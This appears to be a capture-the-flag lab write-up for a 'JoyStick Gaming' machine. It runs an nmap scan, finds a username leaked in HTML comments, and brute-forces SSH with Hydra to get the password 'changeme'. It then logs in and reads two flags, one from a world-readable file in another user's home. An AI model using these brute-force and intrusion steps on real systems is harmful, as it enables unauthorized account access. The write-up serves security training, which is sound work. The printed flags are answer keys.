# nmap
```
root@kali:~# nmap -sV -sC -T5 10.10.194.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 14:14 UTC
Nmap scan report for ip-10-10-194-184.eu-west-1.compute.internal (10.10.194.184)
Host is up (0.0012s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c7:ce:5d:fa:24:68:3a:10:63:f9:28:1b:f4:6d:e5:bc (RSA)
|   256 6b:7b:f5:12:e0:db:bb:b0:ca:f8:f8:c0:84:bc:27:e6 (ECDSA)
|_  256 1b:d4:20:23:d0:5b:32:16:ad:c2:a9:cd:99:1c:e6:6e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: JoyStick Gaming
MAC Address: 02:E5:8F:37:DA:F2 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
root@kali:~#
```


# http
```
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>JoyStick Gaming</title>
  </head>
  <body>
    <p>JoyStick gaming minecraft server, open shortly to the public!</p>
    <!-- Zach, I don't care that you named your user steve. You still need to
      finish making the website -->
    <!-- Great, and now the FTP server just doesn't work. Just another great idea after
	your failed irc chat. Why would we use that when we have in game chat? 
	Not to mention that I know you still haven't reset your password.  -->
  </body>
</html> 
```

```
root@kali:~# hydra -l steve -P /usr/share/wordlists/fasttrack.txt 10.10.194.184 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-13 14:16:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking ssh://10.10.194.184:22/
[22][ssh] host: 10.10.194.184   login: steve   password: changeme
```

```
ssh steve@10.10.194.184
The authenticity of host '10.10.194.184 (10.10.194.184)' can't be established.
ECDSA key fingerprint is SHA256:oetBOaFBZVjvzdLP6vCQfpFB8fl+cxVD5OjVJTDNC6I.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.194.184' (ECDSA) to the list of known hosts.
steve@10.10.194.184's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-47-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

62 packages can be updated.
11 updates are security updates.

steve@notch-VirtualBox:~$ ls -al
total 696
drwxr-xr-x 17 steve steve   4096 May  4  2019 .
drwxr-xr-x  5 root  root    4096 May  3  2019 ..
-rw-------  1 steve steve     32 May  3  2019 .bash_history
-rw-r--r--  1 steve steve    220 May  3  2019 .bash_logout
-rw-r--r--  1 steve steve   3771 May  3  2019 .bashrc
drwx------ 12 steve steve   4096 Jul 13 09:17 .cache
drwx------  3 steve steve   4096 May  3  2019 .compiz
drwx------ 15 steve steve   4096 May  3  2019 .config
drwxr-xr-x  2 steve steve   4096 May  3  2019 Desktop
-rw-r--r--  1 steve steve     25 May  3  2019 .dmrc
drwxr-xr-x  2 steve steve   4096 May  3  2019 Documents
drwxr-xr-x  2 steve steve   4096 May  3  2019 Downloads
-rw-r--r--  1 steve steve   8980 May  3  2019 examples.desktop
drwx------  2 steve steve   4096 May  3  2019 .gconf
drwx------  3 steve steve   4096 May  4  2019 .gnupg
-rw-------  1 steve steve    688 May  4  2019 .ICEauthority
drwx------  3 steve steve   4096 May  3  2019 .local
drwxr-xr-x  2 steve steve   4096 May  3  2019 Music
drwxr-xr-x  2 steve steve   4096 May  3  2019 Pictures
-rw-r--r--  1 steve steve    655 May  3  2019 .profile
drwxr-xr-x  2 steve steve   4096 May  3  2019 Public
-rw-rw-r--  1 notch steve 589485 May  3  2019 snes.png
drwxr-xr-x  2 root  steve   4096 May  3  2019 SteveStuff
drwxr-xr-x  2 steve steve   4096 May  3  2019 Templates
-rw-r--r--  1 steve root      19 May  3  2019 user.txt
drwxr-xr-x  2 steve steve   4096 May  3  2019 Videos
-rw-------  1 steve steve    114 May  4  2019 .Xauthority
-rw-------  1 steve steve   1322 May  4  2019 .xsession-errors
-rw-------  1 steve steve   1242 May  3  2019 .xsession-errors.old
steve@notch-VirtualBox:~$ cat user.txt
flag{is_only_gaem}
```


```
steve@notch-VirtualBox:/home$ ls -al
total 20
drwxr-xr-x  5 root   root    4096 May  3  2019 .
drwxr-xr-x 26 root   root    4096 May  4  2019 ..
drwxr-xr-x  4 nobody nogroup 4096 May  4  2019 minecraft
drwxr-xr-x 18 notch  notch   4096 May  4  2019 notch
drwxr-xr-x 17 steve  steve   4096 May  4  2019 steve
steve@notch-VirtualBox:/home$ ls -al notch/
total 280
drwxr-xr-x 18 notch notch   4096 May  4  2019 .
drwxr-xr-x  5 root  root    4096 May  3  2019 ..
-rw-------  1 notch notch    540 May  3  2019 .bash_history
-rw-r--r--  1 notch notch    220 May  3  2019 .bash_logout
-rw-r--r--  1 notch notch   3771 May  3  2019 .bashrc
drwx------ 14 notch notch   4096 May  4  2019 .cache
drwx------  3 notch notch   4096 May  3  2019 .compiz
drwx------ 15 notch notch   4096 May  3  2019 .config
-rw-rw-r--  1 notch notch 142136 May  3  2019 creeper-minimalist.jpg
drwxr-xr-x  2 notch notch   4096 May  3  2019 Desktop
-rw-r--r--  1 notch notch     25 May  3  2019 .dmrc
drwxr-xr-x  2 notch notch   4096 May  3  2019 Documents
drwxr-xr-x  2 notch notch   4096 May  3  2019 Downloads
-rw-rw-r--  1 notch notch    181 May  4  2019 eula.txt
-rw-r--r--  1 notch notch   8980 May  3  2019 examples.desktop
drwx------  2 notch notch   4096 May  3  2019 .gconf
drwx------  3 notch notch   4096 May  4  2019 .gnupg
-rw-------  1 notch notch    716 May  4  2019 .ICEauthority
drwx------  3 notch notch   4096 May  3  2019 .local
drwxrwxr-x  2 notch notch   4096 May  4  2019 logs
drwxr-xr-x  2 notch notch   4096 May  3  2019 Music
drwxrwxr-x  2 notch notch   4096 May  3  2019 .nano
drwxr-xr-x  2 notch notch   4096 May  3  2019 Pictures
-rw-r--r--  1 notch notch    655 May  3  2019 .profile
drwxr-xr-x  2 notch notch   4096 May  3  2019 Public
-rw-rw-r--  1 notch notch     36 May  3  2019 root.txt
-rw-rw-r--  1 notch notch     66 May  3  2019 .selected_editor
-rw-rw-r--  1 notch notch     59 May  4  2019 server.properties
-rw-r--r--  1 notch notch      0 May  3  2019 .sudo_as_admin_successful
drwxr-xr-x  2 notch notch   4096 May  3  2019 Templates
drwxr-xr-x  2 notch notch   4096 May  3  2019 Videos
-rw-r--r--  1 root  root     168 May  3  2019 .wget-hsts
-rw-------  1 notch notch    177 May  4  2019 .Xauthority
-rw-------  1 notch notch   1157 May  4  2019 .xsession-errors
-rw-------  1 notch notch   1243 May  3  2019 .xsession-errors.old
steve@notch-VirtualBox:/home$
steve@notch-VirtualBox:/home$ cat notch/root.txt
flag{poorly_configured_permissions}
```
